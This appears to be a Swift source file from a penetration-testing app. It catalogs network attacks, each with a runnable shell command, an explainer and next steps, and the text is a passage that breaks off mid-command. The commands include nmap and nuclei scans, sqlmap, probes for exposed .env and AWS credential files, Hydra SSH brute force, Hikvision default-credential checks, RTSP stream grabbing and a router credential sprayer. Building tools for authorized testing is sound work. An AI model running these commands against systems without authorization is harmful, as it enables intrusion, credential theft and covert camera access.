import Foundation

/// Curated catalog of attacks organized for both engineers running real
/// engagements and beginners learning the craft. Every entry carries:
/// an `explainer` (so the operator understands WHY they'd run it),
/// `nextSteps` (a learning ladder), and danger / noise indicators so a
/// person new to network security can read what they're about to do.
public enum AttackCatalog {

    public static let all: [Attack] =
        recon + web + smbAttacks + sshAttacks + cameraAttacks +
        routerAttacks + adAttacks + media + passwordCracks + wireless +
        printerAttacks + iotAttacks + dnsAttacks + bluetoothAttacks +
        mobileAttacks + mitmAttacks + exploitAttacks

    // MARK: - RECON

    public static let recon: [Attack] = [
        Attack(
            id: "recon.nmap.quick",
            title: "Quick port probe",
            description: "Top-100 TCP ports with service version detect.",
            explainer: """
            nmap is the standard tool for finding what's running on a host. \
            -sV asks every service to identify itself; --top-ports 100 \
            covers the ports services actually use (HTTP, SSH, SMB, RDP, etc.) \
            without scanning all 65535. Reads as light reconnaissance traffic.
            """,
            nextSteps: ["Run “Full TCP scan” if anything looks unusual",
                        "Pivot to Web / SSH / SMB attacks for any open service"],
            tool: "nmap",
            command: "nmap -Pn -sV --top-ports 100 --max-retries 1 --host-timeout 30s {ip}",
            timeoutSeconds: 45,
            tier: .quick, category: .recon,
            danger: .observation, noise: .quiet,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "recon.nmap.full",
            title: "Full TCP version scan (1–10000)",
            description: "nmap -sV across the first 10k TCP ports.",
            explainer: """
            Slower but catches services running on non-standard ports. Pen \
            testers who skip this miss admin panels on 8081, debug servers on \
            8888, MongoDB on 27017 and similar “hidden” attack surface.
            """,
            nextSteps: ["Run NSE vuln scripts on anything that looked unusual",
                        "Banner-search Exploit-DB for any specific software version"],
            tool: "nmap",
            command: "nmap -Pn -sV -p 1-10000 --max-retries 1 --host-timeout 4m {ip}",
            timeoutSeconds: 300,
            tier: .heavy, category: .recon,
            danger: .observation, noise: .loud,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "recon.nmap.vuln",
            title: "NSE vuln scripts",
            description: "Run nmap’s `vuln` script category against the host.",
            explainer: """
            nmap ships with hundreds of probes for known CVEs (Heartbleed, \
            EternalBlue, BlueKeep, etc.). The `vuln` category runs the \
            authoritative ones and prints CVSS scores when something matches.
            """,
            nextSteps: ["For any CVE found, look it up in searchsploit",
                        "If a service is exploitable, switch to Metasploit (msfconsole)"],
            tool: "nmap",
            command: "nmap -Pn -sV --script vuln --max-retries 1 --host-timeout 5m {ip}",
            timeoutSeconds: 360,
            tier: .heavy, category: .recon,
            danger: .intrusive, noise: .loud,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "recon.nuclei.basic",
            title: "Nuclei templates (CVEs + misconfigs)",
            description: "Run the community nuclei templates against the host.",
            explainer: """
            nuclei is a YAML-driven scanner with thousands of templates from \
            ProjectDiscovery and the security community. It tests for \
            specific CVEs, exposed admin panels, default credentials, and \
            misconfigurations — much sharper than nikto, much faster than \
            running nmap NSE one CVE at a time.
            """,
            nextSteps: ["Cross-reference any HIGH severity hit with searchsploit",
                        "If subdomains found, run subfinder for related assets"],
            tool: "nuclei",
            command: "nuclei -u http://{ip}/ -severity high,critical -silent -timeout 10 2>&1 | head -60",
            timeoutSeconds: 300,
            tier: .heavy, category: .recon,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.router, .iot, .printer, .laptop, .desktop, .unknown]
        ),
        Attack(
            id: "recon.searchsploit.banner",
            title: "Search Exploit-DB by version banner",
            description: "Pull the version banner with -sV, then searchsploit it.",
            explainer: """
            Exploit-DB is the canonical archive of public exploit code. \
            Searchsploit ships a local copy so the lookup works offline. \
            If a service banner says “OpenSSH 7.2p2” and CVE-2016-10009 \
            exists, you find out in two seconds.
            """,
            nextSteps: ["Read the exploit code if found",
                        "Try the PoC in a controlled lab before running on a real target"],
            tool: "searchsploit",
            command: """
            BANNER=$(nmap -Pn -sV --top-ports 20 --host-timeout 30s {ip} 2>/dev/null | grep -E '^[0-9]+/' | head -3); \
            echo "$BANNER"; echo "---"; \
            echo "$BANNER" | awk -F'  +' '{print $3}' | sed 's/^ *//' | while read svc; do \
              [ -z "$svc" ] && continue; echo ""; echo "## $svc"; searchsploit -t "$svc" 2>/dev/null | head -10; \
            done
            """,
            timeoutSeconds: 90,
            tier: .quick, category: .recon,
            danger: .observation, noise: .quiet,
            appliesTo: Set(DeviceKind.allTargetable)
        ),
        Attack(
            id: "recon.tlsscan",
            title: "TLS / SSL audit (testssl.sh)",
            description: "Identify weak ciphers, expired certs, protocol downgrade.",
            explainer: """
            testssl.sh runs every TLS check that matters in 2026 — protocol \
            versions, cipher suites, certificate validity, HSTS, BREACH, \
            ROBOT, Logjam, Heartbleed, etc. Anything in red is a finding \
            you can write up in a report.
            """,
            nextSteps: ["For weak ciphers, recommend explicit cipher suite list",
                        "If self-signed cert, note for the report"],
            tool: "testssl.sh",
            command: "testssl.sh --quiet --color 0 --severity HIGH https://{ip}/ 2>&1 | head -80",
            timeoutSeconds: 240,
            tier: .heavy, category: .recon,
            executor: .kali,
            danger: .observation, noise: .loud,
            appliesTo: [.router, .iot, .printer, .laptop, .desktop, .unknown]
        ),
        Attack(
            id: "recon.theharvester",
            title: "OSINT email/domain harvest (theHarvester)",
            description: "Pull email addresses, hostnames, employee names from passive sources for the host's apex.",
            explainer: """
            theHarvester queries Bing, DuckDuckGo, certificate logs, \
            Hunter.io, GitHub for any mention of the target's domain. \
            Returns: emails for password sprays, hostnames for further \
            enum, employee names for username generation. Pre-engagement \
            recon staple.
            """,
            nextSteps: ["Generate username candidates from names — first.last, flast, etc.",
                        "Feed the email list into haveibeenpwned to find leaked passwords"],
            tool: "theHarvester",
            command: "APEX=$(host {ip} 2>/dev/null | awk '{print $NF}' | sed 's/\\.$//' | head -1); [ -z \"$APEX\" ] && APEX=example.com; theHarvester -d $APEX -b crtsh,duckduckgo,certspotter -l 200 2>&1 | tail -60",
            timeoutSeconds: 180,
            tier: .heavy, category: .recon,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: [.router, .laptop, .desktop, .unknown],
            skill: .beginner, aptPackage: "theharvester"
        ),
        Attack(
            id: "recon.shodan.lookup",
            title: "Shodan lookup (external view)",
            description: "Query Shodan for the host's external IP — see what the internet sees.",
            explainer: """
            Shodan continuously scans the public internet. For an asset \
            with a public IP, Shodan reports every open port, banner, \
            CVE match, and historical changes. Useful when assessing \
            whether a host is accidentally exposed beyond the LAN.
            """,
            nextSteps: ["Cross-reference any public-exposed services with internal config",
                        "If org has many assets → use Shodan organization filter"],
            tool: "shodan",
            command: "echo 'Need SHODAN_API_KEY in env. Sample:'; echo 'shodan host $(curl -s ifconfig.me) 2>&1 | head -40'",
            timeoutSeconds: 30,
            tier: .quick, category: .recon,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "shodan"
        ),
        Attack(
            id: "recon.masscan",
            title: "Masscan all 65k ports (faster than nmap)",
            description: "Scan EVERY port at 10k pkt/s — sub-30s for a full TCP sweep on LAN.",
            explainer: """
            Masscan is a tcp-syn-only scanner that can scan the entire \
            internet at packet rates nmap can't touch. For a single LAN \
            host, the full 65535 sweep takes ~10s instead of 5min. The \
            output is sparser than nmap (no service detection) — pipe \
            the open-port list to nmap -sV for follow-up.
            """,
            nextSteps: ["Take the open-port list to nmap -sV for service banners",
                        "For UDP coverage → masscan --rate 1000 -pU:1-65535"],
            tool: "masscan",
            command: "sudo -n masscan -p1-65535 {ip} --rate=10000 --wait 2 2>&1 | tail -30 || masscan -p1-65535 {ip} --rate=10000 --wait 2 2>&1 | tail -30",
            timeoutSeconds: 90,
            tier: .heavy, category: .recon,
            executor: .kali,
            danger: .observation, noise: .loud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .intermediate, aptPackage: "masscan"
        ),
        Attack(
            id: "recon.rustscan",
            title: "Rustscan + nmap pipeline",
            description: "RustScan finds open ports in seconds, pipes them to nmap -sV for service detection.",
            explainer: """
            RustScan is the Rust-based port scanner that's gained traction \
            for being easier than masscan and faster than nmap alone. The \
            wrapper finds open ports then automatically launches nmap \
            against those ports for service version detection.
            """,
            nextSteps: ["Pipe nmap output into nuclei for CVE matching",
                        "Compare to the masscan output — they should agree"],
            tool: "rustscan",
            command: "rustscan -a {ip} --range 1-65535 --ulimit 5000 -- -sV -Pn --max-retries 1 2>&1 | tail -40",
            timeoutSeconds: 180,
            tier: .heavy, category: .recon,
            executor: .kali,
            danger: .observation, noise: .loud,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .beginner, aptPackage: "rustscan"
        ),
    ]

    // MARK: - WEB

    public static let web: [Attack] = [
        Attack(
            id: "web.whatweb",
            title: "Fingerprint web stack",
            description: "whatweb identifies the framework, server, plugins.",
            explainer: """
            Before attacking a web app, know what you're attacking. whatweb \
            tells you "WordPress 6.4 + Yoast 22.0" or "Apache 2.4.41 + PHP \
            7.4 + Fortinet WAF" so you can pick the right next tool.
            """,
            nextSteps: ["If WordPress → run wpscan",
                        "If Tomcat / Apache → search version in nuclei templates"],
            tool: "whatweb",
            command: "whatweb -v http://{ip}/ 2>&1 | head -60",
            timeoutSeconds: 45,
            tier: .quick, category: .web,
            danger: .observation, noise: .quiet,
            appliesTo: [.router, .printer, .iot, .laptop, .desktop, .unknown]
        ),
        Attack(
            id: "web.nikto",
            title: "Nikto vulnerability scan",
            description: "Walks the web service for common misconfigs and CVEs.",
            explainer: """
            Old-school but still effective. Nikto tries 6,000+ \
            paths and signatures: outdated /phpmyadmin, exposed /.git, \
            default Joomla install pages, common XSS payloads. Easy first \
            sweep, very noisy in target logs.
            """,
            nextSteps: ["For specific finds → manually verify with curl",
                        "For broad coverage → run nuclei templates afterwards"],
            tool: "nikto",
            command: "nikto -h http://{ip}/ -timeout 5 -maxtime 240 2>&1 | head -200",
            timeoutSeconds: 300,
            tier: .heavy, category: .web,
            danger: .intrusive, noise: .veryLoud,
            appliesTo: [.router, .printer, .iot, .laptop, .desktop, .unknown]
        ),
        Attack(
            id: "web.ffuf.dirs",
            title: "Directory bruteforce (top 1000 paths)",
            description: "ffuf with the SecLists `common.txt` wordlist.",
            explainer: """
            Reveals hidden admin panels, backup files, and forgotten dev \
            endpoints. /backup.zip, /.env, /admin, /wp-admin, /api/v1 — most \
            real-world breaches start by finding one of these.
            """,
            nextSteps: ["Inspect any 200/301/403 response manually",
                        "If admin panel → try router default-cred sweep"],
            tool: "ffuf",
            command: "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://{ip}/FUZZ -t 30 -mc 200,301,302,401,403 -of json -o /dev/stdout 2>&1 | tail -50",
            timeoutSeconds: 240,
            tier: .heavy, category: .web,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.router, .iot, .printer, .unknown]
        ),
        Attack(
            id: "web.feroxbuster",
            title: "Recursive directory scan (feroxbuster)",
            description: "Multi-threaded recursive content discovery.",
            explainer: """
            feroxbuster is what most modern pen testers reach for instead of \
            dirb / dirbuster — multi-threaded Rust, recursion built-in, \
            sane defaults. It walks your hits to find nested admin paths \
            (/api/v1/admin/users) automatically.
            """,
            nextSteps: ["For high-value paths run nuclei against them specifically"],
            tool: "feroxbuster",
            command: "feroxbuster --url http://{ip}/ --silent --timeout 8 --threads 30 --depth 3 --status-codes 200,301,302,401,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt 2>&1 | head -80",
            timeoutSeconds: 300,
            tier: .heavy, category: .web,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.router, .iot, .printer, .unknown]
        ),
        Attack(
            id: "web.wpscan",
            title: "WordPress audit",
            description: "wpscan against a WordPress install.",
            explainer: """
            WordPress runs ~40% of the public web. wpscan enumerates the \
            version, plugins, themes, and users — anything outdated or with \
            known CVEs gets flagged. Highest-ROI scan to run on any WP host.
            """,
            nextSteps: ["For each CVE → check searchsploit for PoC",
                        "Try common-creds against wp-login if usernames found"],
            tool: "wpscan",
            command: "wpscan --url http://{ip}/ --random-user-agent --no-banner --max-threads 5 2>&1 | head -120",
            timeoutSeconds: 240,
            tier: .heavy, category: .web,
            danger: .intrusive, noise: .loud,
            appliesTo: [.unknown, .laptop, .desktop, .iot]
        ),
        Attack(
            id: "web.sqlmap.basic",
            title: "SQL injection probe (sqlmap)",
            description: "sqlmap against the index — fingerprint DBMS, basic injection.",
            explainer: """
            sqlmap automates discovering and exploiting SQL injection \
            vulnerabilities. Even the basic invocation will detect classic \
            errors (UNION, time-based, boolean) and fingerprint the database \
            engine. Heavy and noisy — never run against production without \
            written authorization.
            """,
            nextSteps: ["If injection found → escalate with --dbs --tables",
                        "For credential tables → --dump"],
            tool: "sqlmap",
            command: "sqlmap -u 'http://{ip}/' --batch --random-agent --level=2 --risk=1 --threads=4 --timeout=8 --retries=1 2>&1 | head -100",
            timeoutSeconds: 360,
            tier: .slow, category: .web,
            executor: .kali,
            danger: .intrusive, noise: .veryLoud,
            appliesTo: [.unknown, .iot, .router]
        ),
        Attack(
            id: "web.subfinder",
            title: "Subdomain enumeration (subfinder)",
            description: "Find subdomains of the host’s reverse-DNS apex.",
            explainer: """
            For any host with a real DNS name, subfinder pulls subdomains \
            from passive sources (cert transparency logs, search engines, \
            public archives). Reveals attack surface that doesn’t respond \
            to direct probes — staging.example.com, vpn.example.com, etc.
            """,
            nextSteps: ["Run httpx on the discovered subdomains to find live web services",
                        "nuclei across all live subs for fast triage"],
            tool: "subfinder",
            command: "host {ip} 2>/dev/null | awk '{print $NF}' | sed 's/\\.$//' | head -1 | xargs -I{} subfinder -silent -timeout 30 -d {} 2>&1 | head -40",
            timeoutSeconds: 90,
            tier: .quick, category: .web,
            executor: .kali,
            danger: .passive, noise: .silent,
            appliesTo: [.router, .laptop, .desktop, .unknown]
        ),
        Attack(
            id: "web.gobuster.vhost",
            title: "Virtual host bruteforce (gobuster vhost)",
            description: "Find vhosts not listed in DNS — admin panels often hidden behind Host-header routing.",
            explainer: """
            Many web servers route by Host: header. A single IP can serve \
            10 different sites depending on Host. gobuster vhost iterates \
            a wordlist of subdomains and reports which Host values get \
            distinct responses. Catches admin/internal/dev/staging.
            """,
            nextSteps: ["For each unique vhost → curl with that Host header to inspect",
                        "Test for vhost confusion vulns (RFC-7230 ambiguity)"],
            tool: "gobuster",
            command: "APEX=$(host {ip} 2>/dev/null | awk '{print $NF}' | sed 's/\\.$//' | head -1); [ -z \"$APEX\" ] && APEX=example.com; gobuster vhost -u http://{ip} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30 --append-domain --domain $APEX -q 2>&1 | head -30",
            timeoutSeconds: 240,
            tier: .heavy, category: .web,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.router, .laptop, .desktop, .unknown],
            skill: .intermediate, aptPackage: "gobuster"
        ),
        Attack(
            id: "web.dalfox.xss",
            title: "XSS scan (dalfox)",
            description: "Crawl + test reflective/DOM XSS on the target's web service.",
            explainer: """
            dalfox is a fast XSS-specific scanner — checks parameter \
            reflection, escapes context (HTML, JS, attribute), and \
            generates working PoC payloads. Far less false-positive prone \
            than nuclei's xss templates.
            """,
            nextSteps: ["For confirmed XSS → manually escalate to session theft / CSP bypass",
                        "Also try sqlmap on the same parameters in case both apply"],
            tool: "dalfox",
            command: "echo http://{ip}/ | dalfox pipe --silence --no-color --timeout 10 2>&1 | head -40",
            timeoutSeconds: 240,
            tier: .heavy, category: .web,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.router, .laptop, .desktop, .unknown],
            skill: .intermediate, aptPackage: "dalfox"
        ),
        Attack(
            id: "web.httpx.probe",
            title: "Live web fingerprint (httpx)",
            description: "Confirm the host serves HTTP, grab title + tech stack + status code.",
            explainer: """
            httpx (ProjectDiscovery) is the standard "is it alive?" \
            probe. Faster than curl, returns multiple ports concurrently, \
            includes -tech-detect to show framework / CDN / WAF, -title \
            for page title, -sc for status code. Run before any web attack.
            """,
            nextSteps: ["For 200s → run nuclei -t cves/ or whatweb -v",
                        "For 401/403s → try common-creds + path bruteforce"],
            tool: "httpx",
            command: "echo {ip} | httpx -silent -tech-detect -title -status-code -follow-redirects -ports 80,443,8080,8443,8000,8888 2>&1 | head -30",
            timeoutSeconds: 60,
            tier: .quick, category: .web,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: Set(DeviceKind.allTargetable),
            skill: .beginner, aptPackage: "httpx-toolkit"
        ),
        Attack(
            id: "web.gitleaks",
            title: "Test for exposed .git/.env (curl)",
            description: "Probe for the most common secret leaks: /.git/config, /.env, /backup.zip, /admin/.git/HEAD",
            explainer: """
            Misconfigured deployments leave .git/ exposed (full repo \
            extractable via git-dumper) or commit .env files with API \
            keys. Costs nothing to test, hits often. Each path requested \
            is logged so this is loud — but the response codes alone \
            tell you the answer.
            """,
            nextSteps: ["If /.git/config present → run git-dumper to clone the source tree",
                        "If /.env or /docker-compose.yml → grep for secrets, AWS keys, DB creds"],
            tool: "curl",
            command: "for p in '/.git/config' '/.git/HEAD' '/.env' '/backup.zip' '/backup.sql' '/.svn/entries' '/wp-config.php.bak' '/admin/.env' '/config.json' '/docker-compose.yml' '/private.key' '/.htpasswd' '/server-status' '/.aws/credentials' '/secrets.json'; do code=$(curl -s -o /dev/null --max-time 3 -w '%{http_code} %{size_download}' http://{ip}$p); echo \"  $p → $code\"; done",
            timeoutSeconds: 90,
            tier: .quick, category: .web,
            danger: .observation, noise: .loud,
            appliesTo: [.router, .laptop, .desktop, .unknown]
        ),
    ]

    // MARK: - SMB

    public static let smbAttacks: [Attack] = [
        Attack(
            id: "smb.netexec.enum",
            title: "Null-session SMB enum",
            description: "netexec smb against the host with no credentials.",
            explainer: """
            netexec (formerly crackmapexec) is the swiss-army-knife for \
            Windows / SMB attacks. With no creds it tells you the OS \
            version, signing requirement, whether anonymous bind works, and \
            lists shares if guest auth is allowed. Always the first SMB step.
            """,
            nextSteps: ["If shares listed → smbclient -N to mount each",
                        "If signing not required → consider relay attacks"],
            tool: "netexec",
            command: "netexec smb {ip} --shares 2>&1 | head -40",
            timeoutSeconds: 30,
            tier: .quick, category: .smb,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.laptop, .desktop, .unknown]
        ),
        Attack(
            id: "smb.smbclient.list",
            title: "List shares (anonymous)",
            description: "smbclient -L //{ip} -N — straight from libsmbclient.",
            explainer: """
            Lower-level than netexec. Direct anonymous SMB query to list \
            shares. Useful when netexec misbehaves or you want to see the \
            raw protocol response.
            """,
            nextSteps: ["For each share → smbclient //{ip}/<share> -N to browse"],
            tool: "smbclient",
            command: "smbclient -L //{ip} -N 2>&1 | head -40",
            timeoutSeconds: 25,
            tier: .quick, category: .smb,
            danger: .observation, noise: .quiet,
            appliesTo: [.laptop, .desktop, .unknown]
        ),
        Attack(
            id: "smb.netexec.spider",
            title: "Spider plus shares (auth required)",
            description: "netexec spider_plus with anonymous; surfaces interesting files.",
            explainer: """
            Once you have ANY creds (even anonymous on a misconfigured \
            share), spider_plus walks the share looking for files with \
            credentials, scripts, configs, password files. The “low-hanging \
            password files” trope is real — it works often.
            """,
            nextSteps: ["Look for .ini, .config, .ps1, .vbs, .ssh containing secrets"],
            tool: "netexec",
            command: "netexec smb {ip} -u '' -p '' -M spider_plus 2>&1 | head -40",
            timeoutSeconds: 120,
            tier: .heavy, category: .smb,
            executor: .kali,
            danger: .intrusive, noise: .loud,
            appliesTo: [.laptop, .desktop, .unknown]
        ),
    ]

    // MARK: - SSH

    public static let sshAttacks: [Attack] = [
        Attack(
            id: "ssh.banner",
            title: "Banner + algos",
            description: "ssh-hostkey + ssh2-enum-algos for fingerprint.",
            explainer: """
            The SSH banner reveals the server software (OpenSSH 8.0p1 \
            Ubuntu) and supported algorithms. Old ciphers (3des, arcfour) or \
            weak host-key algorithms are immediate findings.
            """,
            nextSteps: ["Search the banner version on Exploit-DB",
                        "If weak algos → recommend modern cipher list"],
            tool: "nmap",
            command: "nmap -Pn -p 22 -sV --script ssh-hostkey,ssh2-enum-algos {ip} 2>&1 | head -60",
            timeoutSeconds: 45,
            tier: .quick, category: .ssh,
            danger: .observation, noise: .quiet,
            appliesTo: [.laptop, .desktop, .iot, .unknown, .applish, .thisMac]
        ),
        Attack(
            id: "ssh.hydra.short",
            title: "Hydra small common-creds (4 users × 25 pwds)",
            description: "Hydra ssh attack against a small curated list. Rate-limited.",
            explainer: """
            Brute force is loud and slow but instructive — every IoT device \
            in the world that left default creds will fall in the first 25 \
            tries. We use the SecLists top-25 password list with 4 common \
            usernames (root / admin / pi / user). Output shows successful \
            credentials in green when found.
            """,
            nextSteps: ["If creds found → log in via ssh and gather what you have access to",
                        "If nothing → escalate to top-1000 password list (slower)"],
            tool: "hydra",
            command: "echo -e 'root\\nadmin\\npi\\nuser' > /tmp/wm_users; cp /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-25.txt /tmp/wm_pw 2>/dev/null || echo -e 'admin\\npassword\\n123456\\nroot\\ntoor' > /tmp/wm_pw; hydra -L /tmp/wm_users -P /tmp/wm_pw -t 4 -f -e nsr -o /tmp/wm_h.out ssh://{ip} 2>&1 | tail -30",
            timeoutSeconds: 360,
            tier: .slow, category: .ssh,
            executor: .kali,
            danger: .intrusive, noise: .veryLoud,
            appliesTo: [.laptop, .desktop, .iot, .unknown, .router]
        ),
    ]

    // MARK: - CAMERA

    public static let cameraAttacks: [Attack] = [
        Attack(
            id: "cam.onvif.probe",
            title: "ONVIF probe",
            description: "WS-Discovery against the host to enumerate ONVIF services.",
            explainer: """
            ONVIF is the standard for IP camera management. A camera \
            speaking ONVIF will respond to WS-Discovery on UDP/3702 and \
            expose its capabilities (PTZ, recording, audio, snapshot URLs).
            """,
            nextSteps: ["If responsive → try snapshot URL via curl",
                        "Test default Hikvision/Dahua creds"],
            tool: "nmap",
            command: "nmap -Pn -p 3702 -sU --script broadcast-onvif-discover {ip} 2>&1 | head -30; echo '---'; curl -s --max-time 3 http://{ip}/onvif/device_service -o /dev/null -w 'onvif http: %{http_code}\\n' || true",
            timeoutSeconds: 45,
            tier: .quick, category: .camera,
            danger: .observation, noise: .quiet,
            appliesTo: [.camera, .unknown]
        ),
        Attack(
            id: "cam.hikvision.creds",
            title: "Hikvision default credentials",
            description: "Test the most common Hikvision/Dahua admin creds.",
            explainer: """
            Hikvision shipped admin/12345 as default for years. Even devices \
            sold in 2024 still had this enabled out of the box. The script \
            tests the six most common factory passwords against the device's \
            HTTP/SDK endpoints.
            """,
            nextSteps: ["If creds work → log in via web UI for full takeover",
                        "Pull RTSP stream URL from camera config"],
            tool: "curl",
            command: """
            for cred in 'admin:12345' 'admin:admin' 'admin:1234' 'admin:password' 'admin:888888' 'admin:hikvision'; do \
              for port in 80 8000 8080; do \
                code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 -u "$cred" http://{ip}:$port/ISAPI/Security/userCheck 2>/dev/null); \
                echo "$cred @ {ip}:$port -> $code"; \
              done; \
            done
            """,
            timeoutSeconds: 90,
            tier: .quick, category: .camera,
            danger: .intrusive, noise: .loud,
            appliesTo: [.camera]
        ),
        Attack(
            id: "cam.rtsp.urls",
            title: "RTSP path bruteforce",
            description: "Try a curated list of vendor-default RTSP paths.",
            explainer: """
            Each camera vendor uses different RTSP URL formats — \
            /Streaming/Channels/101 for Hikvision, /cam/realmonitor for \
            Dahua, etc. This tests them in turn and prints the OPTIONS \
            response from the camera. A 200 OK means a working stream URL.
            """,
            nextSteps: ["For working URLs → ffplay or ffmpeg to view the stream",
                        "Try with auth (admin:12345@{ip}) if cred test succeeded"],
            tool: "curl",
            command: """
            for path in '/Streaming/Channels/101' '/Streaming/Channels/1' '/cam/realmonitor?channel=1&subtype=0' '/h264/ch1/main/av_stream' '/live' '/live/main' '/av0_0' '/onvif1'; do \
              echo "rtsp://{ip}:554$path"; \
              echo -e "OPTIONS rtsp://{ip}:554$path RTSP/1.0\\nCSeq: 1\\n\\n" | timeout 3 nc {ip} 554 2>/dev/null | head -3; \
              echo '---'; \
            done
            """,
            timeoutSeconds: 60,
            tier: .quick, category: .camera,
            danger: .observation, noise: .quiet,
            appliesTo: [.camera]
        ),
        Attack(
            id: "cam.snapshot",
            title: "Capture snapshot via ffmpeg",
            description: "Pull a single frame from the camera’s RTSP stream.",
            explainer: """
            ffmpeg can decode RTSP and dump a single JPEG frame. Useful \
            when you want to confirm a stream URL works (or, in a real \
            engagement, document what the camera sees). Output written to \
            /tmp/wm_snap.jpg on the executor machine.
            """,
            nextSteps: ["scp the file off and attach to the report",
                        "If stream URL needed creds → re-run after Hikvision cred test"],
            tool: "ffmpeg",
            command: "ffmpeg -y -loglevel error -rtsp_transport tcp -i rtsp://{ip}:554/Streaming/Channels/101 -frames:v 1 /tmp/wm_snap.jpg 2>&1 | head -20; ls -la /tmp/wm_snap.jpg 2>/dev/null",
            timeoutSeconds: 30,
            tier: .quick, category: .camera,
            executor: .kali,
            danger: .observation, noise: .quiet,
            appliesTo: [.camera]
        ),
    ]

    // MARK: - ROUTER

    public static let routerAttacks: [Attack] = [
        Attack(
            id: "router.creds.spray",
            title: "Default-credential sprayer (vendor cheatsheet)",
            description: "Active spray of 30+ known vendor defaults via HTTP Basic + form-POST. Reports concrete WORKS / DOESN'T per pair.",
            explainer: """
            Replaces nmap's http-default-accounts (which only knows ~130 \
            ancient fingerprints and misses every modern ISP CPE). This \
            actively tries common credential pairs against the router's \
            web admin two ways: \n\
              1. HTTP Basic auth — 401 → fail, 200 + non-login body → success \n\
              2. Form-POST to common login endpoints (/login.cgi, \
              /asp/sLogin.asp, the Huawei /?_type=loginData&_tag=login_entry) \
              — Set-Cookie for a session ID OR 302 redirect = success \n\
            Heuristics are conservative — false positives are rare. The \
            output lists every WORKS combo with the URL it was found at \
            so you can immediately log in via browser. Loud (~50 requests) \
            but each is a single shot.
            """,
            nextSteps: ["For each WORKS hit → open admin panel in browser, log in with the cred",
                        "Look at: DNS settings (poison potential), port forwards, attached clients, WAN IP",
                        "Change the password and document — leaving defaults is a real finding"],
            tool: "curl",
            command: """
            IP="{ip}"; \
            CREDS="admin:admin admin:password admin:1234 admin:12345 admin:0000 admin:root \
              admin:Huawei@123 admin:Huawei@2012 admin:admintelecom admin: \
              telecomadmin:admintelecom telecomadmin:admin support:theworldhasnoz \
              root:admin root:root root:Huawei@123 root:Zte521 \
              user:user user: admin:default admin:Admin123 admin:changeme \
              cisco:cisco ubnt:ubnt admin:8888 admin:hikvision admin:hik12345 \
              admin:tplink admin:zte"; \
            HITS=""; \
            echo "[PROBE] router web on $IP"; \
            BASE_URL=""; \
            for proto in https http; do \
              for port in 80 443 8080 8443 8000; do \
                u="$proto://$IP:$port"; \
                code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 3 "$u/" 2>/dev/null); \
                if [ "$code" != "000" ] && [ "$code" != "" ]; then \
                  echo "  $u → $code"; \
                  [ -z "$BASE_URL" ] && BASE_URL="$u"; \
                fi; \
              done; \
            done; \
            [ -z "$BASE_URL" ] && { echo "[err] router has no reachable web admin"; exit 1; }; \
            echo "[base] $BASE_URL"; \
            echo ""; \
            echo "[BASELINE] capturing unauth response so we can diff"; \
            curl -sk -o /tmp/_wm_baseline --max-time 4 "$BASE_URL/" 2>/dev/null; \
            BASELINE_SIZE=$(wc -c < /tmp/_wm_baseline 2>/dev/null | tr -d ' '); \
            BASELINE_HASH=$(md5 -q /tmp/_wm_baseline 2>/dev/null || md5sum /tmp/_wm_baseline 2>/dev/null | awk '{print $1}'); \
            HAS_PWD_FIELD=$(grep -ciE 'type=["\\x27]?password|name=["\\x27]?(pass|pwd)' /tmp/_wm_baseline 2>/dev/null | head -1); \
            HAS_RSA=$(grep -ciE 'jsencrypt|setpublic|rsamodulus|crypto-js' /tmp/_wm_baseline 2>/dev/null | head -1); \
            HAS_AES=$(grep -ciE '\\baes\\.js|aes-?(128|256)|cryptojs\\.aes|encryptedpass|encpass' /tmp/_wm_baseline 2>/dev/null | head -1); \
            HAS_LUCI=$(grep -ciE 'cgi-bin/luci|loginName|loginPass' /tmp/_wm_baseline 2>/dev/null | head -1); \
            echo "  size=$BASELINE_SIZE  has-password-field=$HAS_PWD_FIELD  RSA=$HAS_RSA  AES=$HAS_AES  LuCI=$HAS_LUCI"; \
            if [ "$HAS_RSA" -gt 0 ] 2>/dev/null || [ "$HAS_AES" -gt 0 ] 2>/dev/null; then \
              CRYPTO="RSA"; [ "$HAS_AES" -gt 0 ] && CRYPTO="AES"; [ "$HAS_RSA" -gt 0 ] && [ "$HAS_AES" -gt 0 ] && CRYPTO="RSA+AES"; \
              echo ""; \
              echo "[NOTE] This router encrypts the password client-side ($CRYPTO) before POST."; \
              echo "       Curl/Hydra spraying will NOT work — the server only accepts encrypted"; \
              echo "       payloads. Open the admin panel in your browser and try the cheatsheet"; \
              echo "       credentials in the form by hand (the page's own JS encrypts them):"; \
              echo ""; \
              echo "       admin URL: $BASE_URL"; \
              echo ""; \
              for c in $CREDS; do echo "         $c"; done; \
              echo ""; \
              echo "[advanced] To brute force this you'd need to reverse the JS encryption flow"; \
              echo "           and replicate it in Python. That's a custom job per firmware."; \
              rm -f /tmp/_wm_baseline; exit 0; \
            fi; \
            echo ""; \
            echo "[TRY] HTTP Basic auth — diffing each response against baseline"; \
            for cred in $CREDS; do \
              for path in "/" "/admin" "/admin/" "/management" "/setup.cgi" "/cgi-bin/luci"; do \
                URL="$BASE_URL$path"; \
                CODE=$(curl -sk -o /tmp/_wm_body --max-time 3 -w '%{http_code}' -u "$cred" "$URL" 2>/dev/null); \
